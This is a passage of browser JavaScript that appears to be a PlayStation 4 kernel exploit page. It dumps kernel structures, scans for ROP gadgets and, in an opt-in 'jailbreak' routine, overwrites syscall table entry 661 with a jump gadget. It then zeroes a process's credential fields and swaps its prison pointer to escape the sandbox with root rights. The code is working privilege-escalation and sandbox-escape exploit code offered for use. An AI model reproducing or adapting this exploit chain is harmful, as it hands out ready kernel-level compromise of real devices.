                if (sampleCalls.length < 5) sampleCalls.push("[" + (661 + i) + "]=" + hex(call));
            }
        } catch (_) {}
    }
    setRow("sysent", "count", entriesRead + " plausible");
    mark("SYSENT-661", hex(entryAddr));
    mark("SYSENT-661-CALL", hex(sy_call));
    mark("SYSENT-SAMPLE", sampleCalls.join(" "));
    setBadge("sysent", "OK", "ok");
    setCardState("sysent", "ok");
    setStat("sysent", hex(entryAddr), "ok");
    return { entryAddr: entryAddr, jmpAddr: jmpAddr, call: sy_call };
}

function probeFiledesc(proc0) {
    var p_fd = read64(proc0 + 0x48n);
    setRow("filedesc", "pfd", hex(p_fd), "cyan");
    if (!plausibleKptr(p_fd)) {
        setBadge("filedesc", "N/A", "warn");
        setCardState("filedesc", "warn");
        return;
    }
    // struct filedesc { struct file **fd_ofiles; ... }
    try {
        var ofiles = read64(p_fd + 0x00n);
        setRow("filedesc", "fdt", hex(ofiles), "purple");

        // fd_nfiles is usually near the start
        var nfiles = read64(p_fd + 0x28n);
        if (nfiles > 0x1000n) nfiles = read64(p_fd + 0x18n);
        setRow("filedesc", "nfds", nfiles.toString());

        // cdir / rdir / jdir are vnode pointers inside filedesc
        var cdir = read64(p_fd + 0x50n);
        var rdir = read64(p_fd + 0x58n);
        var jdir = read64(p_fd + 0x60n);
        if (plausibleKptr(cdir)) setRow("filedesc", "cd",  hex(cdir), "cyan");
        if (plausibleKptr(rdir)) setRow("filedesc", "rd",  hex(rdir), "cyan");
        if (plausibleKptr(jdir)) setRow("filedesc", "jdir", hex(jdir), "cyan");
    } catch (_) {}
    setBadge("filedesc", "OK", "ok");
    setCardState("filedesc", "ok");
    mark("FILEDESC", "p_fd=" + hex(p_fd));
}

function probeVmspace(proc0) {
    var vm = read64(proc0 + 0x50n);
    setRow("vm", "vm", hex(vm), "cyan");
    if (!plausibleKptr(vm)) {
        setBadge("vm", "N/A", "warn");
        setCardState("vm", "warn");
        return;
    }
    // struct vmspace { struct vm_map vm_map; struct pmap vm_pmap; ... }
    try {
        var map = read64(vm + 0x00n);
        var pmap = read64(vm + 0x30n);
        if (plausibleKptr(map))  setRow("vm", "map",  hex(map), "purple");
        if (plausibleKptr(pmap)) setRow("vm", "pmap", hex(pmap), "purple");

        // vm_map base/top are inside the map struct
        if (plausibleKptr(map)) {
            var base = read64(map + 0x10n);
            var top  = read64(map + 0x18n);
            setRow("vm", "base", hex(base));
            setRow("vm", "top",  hex(top));
        }
    } catch (_) {}
    setBadge("vm", "OK", "ok");
    setCardState("vm", "ok");
    mark("VMSPACE", "vm=" + hex(vm));
}

function probeGadgets(kbase, sysentInfo, rootAddr, prisonAddr, proc0) {
    mark("PROBE-GADGETS", "expanded scan across kernel windows");

    // Window 1: around sy_call pointer (kernel function body)
    var w1Base = (sysentInfo.call & ~0xFFFn) - 0x1000n;
    if (w1Base < kbase) w1Base = kbase;
    dumpWindow("SCAN-SYCALL", w1Base, 0x4000);

    // Window 2: early kernel text
    dumpWindow("SCAN-EARLY", kbase + 0x1000n, 0x4000);

    // Window 3: around the known jmp gadget
    dumpWindow("SCAN-JMP", (sysentInfo.jmpAddr & ~0xFFn), 0x800);

    // Window 4: around rootvnode
    dumpWindow("SCAN-ROOT", (rootAddr & ~0xFFFn), 0x1000);

    // Window 5: around prison0
    dumpWindow("SCAN-PRISON", (prisonAddr & ~0xFFFn), 0x1000);

    // Window 6: around proc0
    if (plausibleKptr(proc0)) {
        dumpWindow("SCAN-PROC0", (proc0 & ~0xFFFn), 0x1000);
    }

    // Function-prologue density: count "push rbp; mov rbp, rsp" (55 48 89 e5)
    var prologues = 0;
    try {
        var buf = readBytes(kbase + 0x1000n, 0x8000);
        var pat = [0x55, 0x48, 0x89, 0xE5];
        for (var i = 0; i <= buf.length - 4; i++) {
            if (buf[i] === pat[0] && buf[i+1] === pat[1] && buf[i+2] === pat[2] && buf[i+3] === pat[3]) prologues++;
        }
    } catch (_) {}
    mark("SYMBOL-DENSITY", "prologues-in-0x8000=" + prologues);
}

function runProbe() {
    mark("===== KERNEL PROBE START =====", "fw=" + FW_LABEL + " rev=" + REVISION);

    try {
        var kbase = 0xffffffff80000000n;
        mark("KBASE-ASSUMED", hex(kbase));

        var evf       = fwOffsets.evf;
        var prison0   = fwOffsets.prison0;
        var rootvnode = fwOffsets.rootvnode;
        var sysent    = fwOffsets.sysent;
        var jmp       = fwOffsets.jmp;

        // Phase 1: kernel header
        probeKernelHeader(kbase);

        // Phase 2: strings
        probeStrings(kbase);

        // Phase 3: core structures
        var proc0 = probeProc0(kbase, evf);
        var prisonAddr = kbase + BigInt(prison0);
        probePrison0(kbase, prison0);
        var rootAddr = kbase + BigInt(rootvnode);
        probeRootvnode(kbase, rootvnode);

        // Phase 4: credentials
        if (plausibleKptr(proc0)) {
            probeUcred(proc0);
            probeFiledesc(proc0);
            probeVmspace(proc0);
        }

        // Phase 5: sysent
        var sysentInfo = probeSysent(kbase, sysent, jmp);

        // Phase 6: gadgets
        probeGadgets(kbase, sysentInfo, rootAddr, prisonAddr, proc0);

        // Summary
        mark("ROP-SUMMARY",
            "kb=" + hex(kbase) +
            " sysent=" + hex(sysentInfo.entryAddr) +
            " jmp=" + hex(sysentInfo.jmpAddr) +
            " prison0=" + hex(prisonAddr) +
            " rootvnode=" + hex(rootAddr));

        mark("===== KERNEL PROBE COMPLETE =====", "fw=" + FW_LABEL);
        setStatus("halted", "PROBE COMPLETE", "all reachable structures dumped");

    } catch (err) {
        mark("PROBE-ERROR", (err && err.name) + ":" + String(err && err.message).slice(0, 120));
    }
}

/* ============================================================
 *  PS4 JAILBREAK (opt-in via ?jb=1)
 * ============================================================ */
function runJailbreak() {
    mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);
    try {
        var kbase = 0xffffffff80000000n;
        var sysent_661 = kbase + BigInt(fwOffsets.sysent);
        var jmp_rsi = kbase + BigInt(fwOffsets.jmp);
        var sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
        var sy_call = read64(sysent_661 + 8n);
        var sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);
        write64(sysent_661, 2n);
        write64(sysent_661 + 8n, jmp_rsi);
        write64(sysent_661 + 0x2Cn, 1n);
        mark("SYSENT-HIJACKED", "success");
        var proc = kbase + BigInt(fwOffsets.evf);
        var prisonVal = read64(kbase + BigInt(fwOffsets.prison0));
        var sandboxEscaped = false;
        for (var i = 0; i < 0x4000; i += 8) {
            try {
                var c = read64(proc + BigInt(i));
                if ((c & 0xFFFFFFFFn) === 0x726f7272n) {
                    var ucred = read64(proc + BigInt(i - 0x40));
                    if (plausibleKptr(ucred)) {
                        write64(ucred + 0x04n, 0n);
                        write64(ucred + 0x08n, 0n);
                        write64(ucred + 0x0Cn, 0n);
                        write64(ucred + 0x10n, 1n);
                        write64(ucred + 0x30n, prisonVal);
                        if (read64(ucred + 0x04n) === 0n) {
                            sandboxEscaped = true;
                            mark("SANDBOX-ESCAPE", "success");
                        }
                        break;
                    }
                }
            } catch (_) {}
        }
        write64(sysent_661, BigInt(sy_narg));
        write64(sysent_661 + 8n, sy_call);
        write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
        mark("SYSENT-RESTORED", "success");
        mark("===== JAILBREAK COMPLETE =====", "root=" + sandboxEscaped);
    } catch (error) {
        mark("JAILBREAK-ERROR", error.message);
    }
}

/* ============================================================
 *  BOOT
 * ============================================================ */
var attemptSucceeded = false;

function runAttempt() {
    mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-post=" + (RUN_JAILBREAK ? "jb" : "probe"));
    try {
        buildAndStoreGraph();
        prepareAddrof();
    } catch (error) {
        mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
        failTerminal("setup");
    }
}

buildDashboard();

try {
    document.getElementById("toolbarMeta").textContent =
        "rev " + REVISION + " · fw " + (FW_LABEL || "?") + " · post " + (RUN_JAILBREAK ? "JB" : "PROBE");
} catch (_) {}

(function seedFirmwareCard() {
    setRow("fw", "label", FW_LABEL || "(undetected)", FW_LABEL ? "ok" : "warn");
    setRow("fw", "ua",    navigator.userAgent);
    setRow("fw", "rev",   REVISION);
    if (FW_LABEL && fwOffsets) {
        setRow("fw", "off-evf",     "0x" + fwOffsets.evf.toString(16), "cyan");
        setRow("fw", "off-prison0", "0x" + fwOffsets.prison0.toString(16), "cyan");
        setRow("fw", "off-root",    "0x" + fwOffsets.rootvnode.toString(16), "cyan");
        setRow("fw", "off-sysent",  "0x" + fwOffsets.sysent.toString(16), "cyan");
        setRow("fw", "off-jmp",     "0x" + fwOffsets.jmp.toString(16), "cyan");
        setBadge("fw", "OK", "ok");
        setCardState("fw", "ok");
        setStat("fw", FW_LABEL, "ok");
    } else {
        setBadge("fw", "UNKNOWN", "warn");
        setCardState("fw", "warn");
        setStat("fw", "unknown", "warn");
    }
})();

runAttempt();
